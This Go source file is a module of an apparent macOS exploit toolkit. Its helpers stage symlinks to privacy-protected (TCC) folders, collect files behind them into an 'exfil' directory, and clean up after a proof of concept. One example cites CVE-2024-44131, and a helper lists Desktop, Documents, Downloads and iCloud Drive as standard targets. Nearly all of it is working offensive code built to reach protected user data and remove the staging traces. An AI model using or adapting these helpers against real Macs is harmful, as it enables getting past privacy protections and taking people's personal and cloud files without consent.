// Package fs provides filesystem staging helpers for building symlink-based
// TCC bypass trees, harvesting exfiltrated files, and cleaning up after a PoC.
//
// Usage:
//
//	import "mackit/fs"
//
//	stage, err := fs.CreateSymlinkStage("mypoс", map[string]string{
//	    "Desktop": "/Users/alice/Desktop",
//	    "iCloud":  "/Users/alice/Library/Mobile Documents/com~apple~CloudDocs",
//	})
//	results, err := fs.Harvest(exfilDir)
//	err = fs.CleanStage(stageDir, exfilDir)
package fs

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// ─── Types ───────────────────────────────────────────────────────────────────

// HarvestResult describes one file found during a Harvest walk.
type HarvestResult struct {
	// OriginalLink is the symlink inside the staging directory that was followed.
	OriginalLink string

	// Path is the absolute path to the harvested file on disk.
	Path string

	// Size is the file size in bytes.
	Size int64

	// ModTime is the file modification time.
	ModTime time.Time
}

// ─── CreateSymlinkStage ───────────────────────────────────────────────────────

// CreateSymlinkStage creates a named staging directory under /tmp and populates
// it with symlinks pointing at TCC-protected targets.
//
// targets maps link-name → absolute target path.
//
// Returns the path to the staging directory.
//
// Example:
//
//	stage, err := fs.CreateSymlinkStage("CVE-2024-44131", map[string]string{
//	    "Desktop":   "/Users/alice/Desktop",
//	    "Documents": "/Users/alice/Documents",
//	})
func CreateSymlinkStage(name string, targets map[string]string) (string, error) {
	stageDir := filepath.Join("/tmp", name+"-staging")

	if err := os.MkdirAll(stageDir, 0700); err != nil {
		return "", fmt.Errorf("CreateSymlinkStage mkdir: %w", err)
	}

	for linkName, target := range targets {
		linkPath := filepath.Join(stageDir, linkName)

		// Remove stale symlink if present.
		_ = os.Remove(linkPath)

		if err := os.Symlink(target, linkPath); err != nil {
			return "", fmt.Errorf("CreateSymlinkStage symlink %s → %s: %w", linkName, target, err)
		}
	}

	return stageDir, nil
}

// ─── CreateExfilDir ───────────────────────────────────────────────────────────

// CreateExfilDir creates an empty exfiltration destination directory.
// Returns the absolute path.
func CreateExfilDir(name string) (string, error) {
	dir := filepath.Join("/tmp", name+"-exfil")
	if err := os.MkdirAll(dir, 0700); err != nil {
		return "", fmt.Errorf("CreateExfilDir: %w", err)
	}
	return dir, nil
}

// ─── Harvest ──────────────────────────────────────────────────────────────────

// Harvest walks dir recursively and returns metadata for every regular file
// found. Symlinks at the top level are followed; nested symlinks are not.
func Harvest(dir string) ([]HarvestResult, error) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil, fmt.Errorf("Harvest ReadDir %s: %w", dir, err)
	}

	var results []HarvestResult

	for _, entry := range entries {
		linkPath := filepath.Join(dir, entry.Name())

		// Resolve top-level symlinks.
		target, err := filepath.EvalSymlinks(linkPath)
		if err != nil {
			// Dangling symlink — skip.
			continue
		}

		err = filepath.Walk(target, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil // Permission denied etc. — continue.
			}
			if info.IsDir() {
				return nil
			}
			results = append(results, HarvestResult{
				OriginalLink: linkPath,
				Path:         path,
				Size:         info.Size(),
				ModTime:      info.ModTime(),
			})
			return nil
		})
		if err != nil {
			// Non-fatal — continue to next entry.
			continue
		}
	}

	return results, nil
}

// ─── CopyFile ────────────────────────────────────────────────────────────────

// CopyFile copies src to dst, creating intermediate directories as needed.
// Useful for staging individual files before trigger.
func CopyFile(src, dst string) error {
	if err := os.MkdirAll(filepath.Dir(dst), 0700); err != nil {
		return fmt.Errorf("CopyFile MkdirAll: %w", err)
	}

	in, err := os.Open(src)
	if err != nil {
		return fmt.Errorf("CopyFile open src: %w", err)
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return fmt.Errorf("CopyFile create dst: %w", err)
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

// ─── CleanStage ───────────────────────────────────────────────────────────────

// CleanStage removes all provided paths (directories or files). It is
// intentionally best-effort: errors are collected but do not abort cleanup.
func CleanStage(paths ...string) error {
	var errs []string
	for _, p := range paths {
		if err := os.RemoveAll(p); err != nil {
			errs = append(errs, fmt.Sprintf("%s: %v", p, err))
		}
	}
	if len(errs) > 0 {
		return fmt.Errorf("CleanStage errors: %s", strings.Join(errs, "; "))
	}
	return nil
}

// ─── StandardTargets ──────────────────────────────────────────────────────────

// StandardTargets returns a map of common TCC-protected directories for the
// given home directory.  Suitable as input to CreateSymlinkStage.
func StandardTargets(home string) map[string]string {
	return map[string]string{
		"Desktop":   filepath.Join(home, "Desktop"),
		"Documents": filepath.Join(home, "Documents"),
		"Downloads": filepath.Join(home, "Downloads"),
		"iCloud":    filepath.Join(home, "Library", "Mobile Documents", "com~apple~CloudDocs"),
	}
}
